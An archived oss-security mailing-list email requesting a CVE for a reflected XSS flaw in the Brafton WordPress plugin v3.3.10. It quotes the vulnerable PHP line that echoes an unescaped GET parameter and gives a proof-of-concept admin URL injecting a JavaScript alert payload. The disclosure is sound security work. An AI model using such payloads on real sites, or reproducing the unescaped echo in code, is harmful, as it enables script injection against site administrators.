X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["2121" "Friday" "20" "May" "2016" "10:00:37" "-0400" "Mehrdad Linux" "mehrdadlinux@gmail.com" "<CAC3DZsRDzjmsO0ui_OEhb5SktYu=KBWinUFadFw4QOsL3ofBAQ@mail.gmail.com>" "69" "[oss-security] CVE Request -Vulnerabilitie XSS in brafton WordPress Plugin" nil nil nil "5" "2016052014:00:37" "[oss-security] CVE Request -Vulnerabilitie XSS in brafton WordPress Plugin" (number mark "U       mehrdadlinux May 20   69/2121  " thread-indent "\"[oss-security] CVE Request -Vulnerabilitie XSS in brafton WordPress Plugin\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 12238 invoked by uid 550); 20 May 2016 14:10:09 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 7925 invoked from network); 20 May 2016 14:01:28 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20120113;
        h=mime-version:from:date:message-id:subject:to;
        bh=7+HMH3pJEYWFtKVBhFnYntrzhDzwrm5DJh238iPiiZg=;
        b=HjvlW9GMKnsKQhbe3sf/QW45FFeTSfA4WSeASbQqzlckfl2vENQxN2AriPo5z4e5zH
         0ORDZY4Z5jiLysZrjLtkDNwjT6f2upAHXZwUdtIb8iPK0ufw6px8J131uLyNhiKuhIhn
         TehfPpqP1BZbF5t7R8jWaY23A2cY4kuLVIkoowp4TY7Kk0SxcKtLn05UHhv6S1XXdvl4
         yeDOubUwoDL/AoM/BVoUdHAjXhkncYp6py0RYqTNCVkpMTkmko4xhiRfF7OKZAHfVcmj
         u80lOm6FLUfPWTMbqR2E/tbW6MjFGhTYKHrYnA3mlTzcjUyLkZznqBpeWOOzS30wqmkc
         ztXA==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20130820;
        h=x-gm-message-state:mime-version:from:date:message-id:subject:to;
        bh=7+HMH3pJEYWFtKVBhFnYntrzhDzwrm5DJh238iPiiZg=;
        b=Y0/hec0m195lbiHopgBboci9skw704+t5s5my4X182nEIfkYjXdHZgqIH/E0ELSXtK
         6otfpXJ0df+mN+pD21MHoqXnU7VcjB1Aq6RxwG2E+UBcJ9WAAM6WbScuqpMM+n1+uQKA
         BBYih/qgxxsNy/mYKdkWIqbCv5+fci9ih42p7DRYMopTKrlC8Tl+rX+U2xNuQiA/YWpL
         VwiXrtgIUblhL9gjYVWxuVzlD3/H7SrzrF8uHaS15W1uzCcJFX/c7a+zTbXRrmUarqgJ
         oPnxvei31MYGueG+ljKUrys5Tvo2y+fE9/DDuudg7R897D9Q0okqEP93OFAn8J33DBm3
         ILWQ==
X-Gm-Message-State: AOPr4FUV+ptULvCzPQ30biRWbqwLNR2ngturhXuMC5NEpFtA8rrh8B2FzQONOFgmjViHPBBXhbQJ3cIcqSkDQg==
X-Received: by 10.112.43.225 with SMTP id z1mr1198723lbl.14.1463752876695;
 Fri, 20 May 2016 07:01:16 -0700 (PDT)
MIME-Version: 1.0
From: Mehrdad Linux <mehrdadlinux@gmail.com>
Date: Fri, 20 May 2016 10:00:37 -0400
Message-ID: <CAC3DZsRDzjmsO0ui_OEhb5SktYu=KBWinUFadFw4QOsL3ofBAQ@mail.gmail.com>
To: oss-security@lists.openwall.com
Content-Type: multipart/alternative; boundary=001a113610e64124f705334686e2
Subject: [oss-security] CVE Request -Vulnerabilitie XSS in brafton WordPress Plugin

--001a113610e64124f705334686e2
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: quoted-printable

Title -brafton WordPress Plugin XSS

# Exploit Title :  Vulnerabilitie XSS in brafton WordPress Plugin
# Date: Fri May 20  2016
# Reported Date : Fri May 20  2016
# Vendor Homepage: http://www.brafton.com/support/wordpress/
# Version: v3.3.10 =E2=80=93 January2016
# Software Link:
https://github.com/ContentLEAD/BraftonWordpressPlugin/archive/master.zip
# Exploit Author :MehrdadLinux
# Tested On : Linux Platforms.
# Fix/Patching : Update To
# Facebook : https://facebook.com/MehrdadLinux
# Twitter : http://twitter.com/MehrdadLinux
# Detailed Vul: http://blog.opsnit.com
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

1. VULNERABILITY
-------------------------

brafton WordPress Plugin  v3.3.10 =E2=80=93 January2016


2. BACKGROUND
-------------------------
this is WordPress Plugin  for Brafton

Brafton is a content marketing agency.
Our in-house teams develop and execute SEO-optimized content strategies,
from news to infographics


3. DESCRIPTION
-------------------------
XSS in BraftonAdminPage.php

in line 11 :
    tab =3D <?php if(isset($_GET['tab'])){ echo $_GET['tab'];} else{ echo
0;}?>;

wordpress/wp-admin/admin.php?page=3DBraftonArticleLoader&tab=3Dalert(String=
.fromCharCode(77,101,104,114,100,97,100,76,105,110,117,120,32,88,83,83))


4. discovered by :
-------------------------

The vulnerability has been discovered by Mehrdad Abbasi(MehrdadLinux) and
Hossein Masoudi (cs.masoudi)
email : MehrdadLinux (at) gmail (dot) com
http://opsnit.com


5 .LEGAL NOTICES
-------------------------

The information contained within this advisory is supplied "as-is" with
no warranties or guarantees of fitness of use or otherwise. I accept no
responsibility for any damage caused by the use or misuse of this
information.

--001a113610e64124f705334686e2--
